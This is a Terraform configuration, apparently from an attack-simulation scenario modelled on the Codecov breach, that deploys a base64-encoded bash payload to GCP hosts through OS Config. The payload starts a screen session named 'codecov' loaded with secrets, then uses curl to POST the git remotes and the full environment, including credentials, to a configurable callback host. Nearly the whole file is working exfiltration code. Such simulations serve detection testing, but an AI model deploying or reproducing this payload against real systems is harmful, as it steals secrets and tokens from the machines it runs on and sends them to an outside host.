locals {
    host_ip = var.host_ip
    host_port = var.host_port
    git_origin=var.git_origin
    env_secrets=join(" ", var.env_secrets)
    callback_url = var.use_ssl == true ? "https://${local.host_ip}:${local.host_port}" : "http://${local.host_ip}:${local.host_port}"
    command_payload=<<-EOT
    LOGFILE=/tmp/${var.tag}.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    rm -rf /tmp/repo
    mkdir -p /tmp/repo
    cd /tmp/repo
    git init
    git remote add origin ${local.git_origin}
    log "running curl post: curl -sm 0.5 -d \"$(git remote -v)<<<<<< ENV $(env)\" ${local.callback_url}/upload/v2"
    curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" ${local.callback_url}/upload/v2 >> $LOGFILE 2>&1
    sleep 30
    exit
    EOT
    base64_command_payload=base64encode(local.command_payload)
    payload = <<-EOT
    LOGFILE=/tmp/${var.tag}.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    MAXLOG=2
    for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
    mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true
    check_package_manager() {
        pgrep -f "apt" || pgrep -f "dpkg" || pgrep -f "yum" || pgrep -f "rpm"
    }
    while check_package_manager; do
        log "Waiting for package manager to be available..."
        sleep 10
    done
    screen -S codecov -X quit
    truncate -s 0 /tmp/codecov.log
    log "checking for git..."
    while ! which git; do
        log "git not found - waiting"
        sleep 10
    done
    log "git: $(which git)"
    screen -d -Logfile /tmp/codecov.log -S codecov -m env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ${local.env_secrets} /bin/bash --noprofile --norc
    screen -S codecov -X colon "logfile flush 0^M"
    log 'sending screen command: ${local.command_payload}';
    screen -S codecov -p 0 -X stuff "echo '${local.base64_command_payload}' | base64 -d | /bin/bash -^M"
    sleep 30
    screen -S codecov -X quit
    log "done"
    EOT
    base64_payload = base64encode(local.payload)
}

#####################################################
# GCP OSCONFIG
#####################################################

module "osconfig" {
  source            = "../../../../../common/gcp/osconfig/base"
  environment       = var.environment
  deployment        = var.deployment
  gcp_project_id    = var.gcp_project_id
  gcp_location      = var.gcp_location
  tag               = var.tag
  base64_payload    = local.base64_payload
}